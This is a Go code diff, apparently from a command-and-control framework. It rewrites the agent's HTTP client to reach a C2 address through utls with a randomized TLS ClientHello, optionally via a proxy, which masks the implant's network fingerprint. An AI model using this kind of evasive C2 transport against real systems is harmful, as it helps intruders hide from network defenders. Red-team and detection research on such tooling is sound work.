@@ -1,15 +1,13 @@
 package tun
 
 import (
-	"crypto/tls"
 	"crypto/x509"
 	"log"
 	"net/http"
 	"net/url"
-	"time"
 
 	"github.com/fatih/color"
-	"golang.org/x/net/http2"
+	utls "github.com/refraction-networking/utls"
 )
 
 var (
@@ -23,9 +21,18 @@ var (
 )
 
 // EmpHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
-func EmpHTTPClient(proxyServer string) *http.Client {
+func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 	// start with an empty pool
 	rootCAs := x509.NewCertPool()
+
+	// C2 URL
+	c2url, err := url.Parse(c2_addr)
+	if err != nil {
+		LogFatalError("Erro parsing C2 address '%s': %v", c2_addr, err)
+	}
+
+	// C2 host
+	c2_host := c2url.Hostname()
 
 	// add our cert
 	if ok := rootCAs.AppendCertsFromPEM(CACrt); !ok {
@@ -33,29 +40,34 @@ func EmpHTTPClient(proxyServer string) *http.Client {
 	}
 
 	// Trust the augmented cert pool in our TLS client
-	config := &tls.Config{
+	config := &utls.Config{
+		ServerName:         c2_host,
 		InsecureSkipVerify: false,
 		RootCAs:            rootCAs,
 	}
 
-	// transport of our http client, with configured TLS client
-	tr := &http.Transport{
-		TLSClientConfig:     config,
-		TLSHandshakeTimeout: 10 * time.Second,
-	}
-
-	// use a proxy for our HTTP client
+	// set proxyURL to nil to use direct connection for C2 transport
+	proxyDialer, err := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
 	if proxyServer != "" {
+		// use a proxy for our HTTP client
 		proxyUrl, err := url.Parse(proxyServer)
 		if err != nil {
 			LogFatalError("Invalid proxy: %v", err)
 		}
-		tr.Proxy = http.ProxyURL(proxyUrl)
+
+		proxyDialer, err = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
 	}
-	err := http2.ConfigureTransport(tr) // upgrade to HTTP2, while keeping http.Transport
+
+	// transport of our http client, with configured TLS client
+	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
 	if err != nil {
-		LogFatalError("Cannot switch to HTTP2: %v", err)
+		LogFatalError("makeRoundTripper: %v", err)
 	}
+
+	// err = http2.ConfigureTransport(tr) // upgrade to HTTP2, while keeping http.Transport
+	// if err != nil {
+	// 	LogFatalError("Cannot switch to HTTP2: %v", err)
+	// }
 
 	return &http.Client{Transport: tr}
 }
